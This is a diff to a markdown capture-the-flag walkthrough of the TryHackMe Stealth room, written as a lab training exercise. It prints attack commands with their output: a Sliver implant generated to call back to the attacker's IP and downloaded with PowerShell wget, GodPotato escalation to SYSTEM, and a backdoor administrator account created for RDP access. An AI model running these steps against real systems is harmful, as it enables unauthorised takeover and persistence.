@@ -118,7 +118,7 @@ This still did not provide me with any luck, and this is where I got stuck and h
 
 ## 🛠️ Initial Access
 
-After some research what I learnt was that the contents of the `.ps1` files being uploaded was being scanned and then also executed with the results being blind. Other users where able to quite cleverly I thought get simple commands to execute, have the output sent back to their attacking machine in the body of a HTTP POST. This request as captured via a netcat listener. 
+After some research what I learnt was that the contents of the `.ps1` files being uploaded was being scanned and then also executed with the results being blind. Other users where able to quite cleverly I thought get simple commands to execute, have the output sent back to their attacking machine in the body of a HTTP POST. This request as captured via a netcat listener. The guide I found this in can be seen in the appendix.  
 
 The big trick I was missing is that because the `.ps1` files are being executed, we can use them to copy a web shell onto the target in the `C:\xampp\htdocs\` directory.
 
@@ -152,7 +152,7 @@ I undertook some simple recon here to determine privileges and before looking fo
 
 ## 🛠️ Privilege Escalation
 
-First we need to select our chosen potato and in my case, I went with GodPotato found here: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) I downloaded the `GodPotato-Net4.exe` to match the target system.  
+First, we need to select our chosen potato and, in my case, I went with GodPotato found here: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato) I downloaded the `GodPotato-Net4.exe` to match the target system.  
 Once downloaded I renamed the file and made it executable
 ```bash
 mv GodPotato-NET4.exe potato.exe
@@ -169,9 +169,8 @@ Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
 ```
 
 Now we can execute a simple test `whoami` to confirm we can use GodPotato to escalate via the following syntax `.\potato.exe -cmd "cmd /c whoami"`
-```
+```cmd
 evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "cmd /c whoami"
-[*] CombaseModule: 0x140704725794816
 Removed for brevity
 [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
 [*] CurrentsImpersonationLevel: Impersonation
@@ -188,16 +187,178 @@ At this stage my plan was to use GodPotato to execute a Sliver implant on the ta
 
 ### 🛰️ Sliver Method
 
-Here I briefly detail the steps I took to gain a Silver session as `NT AUTHORITY\SYSTEM` on the target and the issues I ran into. If you just want to get the flags and complete the challenge you can view the **User Creation and RDP Method**  
+Here I briefly detail the steps I took to gain a Sliver session as `NT AUTHORITY\SYSTEM` on the target and the issues I ran into. If you just want to get the flags and complete the challenge you can view the **User Creation and RDP Method**  
 
+First start Sliver
+```bash
+┌──(machonachos㉿kali)-[~]
+└─$ sudo systemctl start sliver
+
+┌──(machonachos㉿kali)-[~]
+└─$ sliver                     
+Connecting to localhost:31337 ...
+
+sliver >  
+```
+Once Sliver is up and running an implant needs to be generated for the target system. Note it is useful to compile new implants as they are dynamically compiled with per-binary asymmetric encryption keys.  
+```console
+sliver > generate --mtls 10.4.12.97:9001 --os windows --format exe --save ~/THMCTF/data.exe
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 47s
+[*] Implant saved to /home/machonachos/THMCTF/data.exe
+```
+Now setup an matching listener in Sliver.
+```console
+sliver > mtls -L 10.4.12.97 -l 9001
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1
+
+sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile 
+==== ====== ========== ====== ===============
+ 1    mtls   tcp        9001                 
+```
+Now to transfer the created implant `data.exe` to the target via a HTTP Server
+```bash
+evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/data.exe -outfile data.exe
+```
+```bash
+python3 -m http.server 5050
+Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
+10.201.104.177 - - [03/Oct/2025 20:36:45] "GET /data.exe HTTP/1.1" 200 -
+```
+
+Now to execute the implant we can use GodPotato to execute it as `NT AUTHORITY\SYSTEM`
+```cmd
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd ".\data.exe"
+```
+This should trigger a session in Sliver as `NT AUTHORITY\SYSTEM`
+```console
+[*] Session 6c1d11e1 EFFECTIVE_SODA - 10.201.104.177:49784 (HostEvasion) - windows/amd64 - Fri, 03 Oct 2025 20:39:02 AEST
+sliver > sessions
+
+ ID         Transport   Remote Address         Hostname      Username              Operating System   Health  
+========== =========== ====================== ============= ===================== ================== =========
+ 6c1d11e1   mtls        10.201.104.177:49784   HostEvasion   NT AUTHORITY\SYSTEM   windows/amd64      [ALIVE] 
+```
+
+We can now use this session to interact with the target and try gain shell access.
+```console
+sliver > sessions -i 6c1d11e1
+
+[*] Active session EFFECTIVE_SODA (6c1d11e1)
+
+sliver (EFFECTIVE_SODA) > shell
+
+? This action is bad OPSEC, are you an adult? Yes
+
+[*] Wait approximately 10 seconds after exit, and press <enter> to continue
+[*] Opening shell tunnel (EOF to exit) ...
+
+[*] Started remote shell with pid 6120
+```
+
+Here is where I ran into issues and the shell would just constantly break and exit as soon as I tried to interact with it.  
+![Compuer Says No Gif](https://www.bigfooty.com/forum/media/computer-says-no-carol-beer-gif.146670/full)
+
+I was thinking it is possibly due to Defender/AMSI not liking something about the way the shell process has been initiated on the target using `NT AUTHORITY\SYSTEM` I had no issues doing the same as the `evader` user and could interact with the shell no problems. 
+
+Anyway, as such I moved onto the second method which I was confident would work as a backup, detailed below.  
 
 ---
 
 ### 🖥️ User Creation and RDP Method
 
+The goal for this method is to use GodPotato to add a new user onto the target into the administrators group. We can then use the open RDP port to gain a session as this new user.
+
+The below command will be used to create a new user called `tester` with a password of `Password123`.
+```cmd
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net user tester Password123 /add"
+Removed for brevity
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 828
+The command completed successfully.
+```
+This can sometimes error due to password policy requirements, and you may need to adjust the password and try again.  
+In this instance we look to have been successful, but we can double check via the below. 
+```cmd
+evader@HostEvasion:C:\xampp\htdocs# net users
+
+User accounts for \\HOSTEVASION
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           evader
+Guest                    tester                   WDAGUtilityAccount
+The command completed successfully.
+```
+Now to add the `tester` user to the administrators group on the target.
+```cmd
+evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net localgroup administrators tester /add"
+Removed for brevity
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 532 Token:0x616  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2592
+The command completed successfully.
+```
+Success again and this can be confirmed below.  
+```cmd
+evader@HostEvasion:C:\xampp\htdocs# net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+tester
+The command completed successfully.
+```
+
+Now that our new user has been all setup we can use FreeRDP to access the target via open port `3389`  
+```bash
+xfreerdp3 /v:HostEvasion /u:tester /p:Password123
+```
+This should pop open a new window and after a moment load you into the target via the GUI as the user `tester`  
+![RDP - start.png](./Images/RDP%20-%20start.png)  
+
+Now we can hunt down the flags and complete the challenge.  
+
 ---
 
-## 🛠️ Flags
+## 🎌 Flags
+
+I first tried to grab the flags via PowerShell with the below code which I came across in the guide linked in the appendix.    
+```powershell
+Get-ChildItem C:\Users -Recurse | Select-String "THM{"
+```
+
+But as this machine has UAC enabled, I could not accept the popup when this script was trying to search the `Administrator` folder via CLI. There are ways to bypass UAC when using the CLI, but that was not necessary in this instance.  
+
+---
+
+### 🚩 User Flag 
+
+Navigate manually to the Desktop folder of `evader` at `C:\Users\evader\Desktop` 
+But there is no flag, just a file called `encodedflag`  
+![RDP - Encodedflag.png](./Images/RDP%20-%20Encodedflag.png)  
+
+
+### 🏴‍☠️ Root Flag
 
 
 ---
@@ -208,3 +369,7 @@ Here I briefly detail the steps I took to gain a Silver session as `NT AUTHORITY
 ---
 
 Thank you for following through my guide of the TryHackMe Stealth room.
+
+
+### Appendices
+Guide I referenced when stuck:  [TryHackMe Stealth Walkthrough by Rich](https://happycamper84.medium.com/tryhackme-stealth-walkthrough-ea84fcf54b8b) They have some other great resources on their blog which I will certainly utilise in the future.  
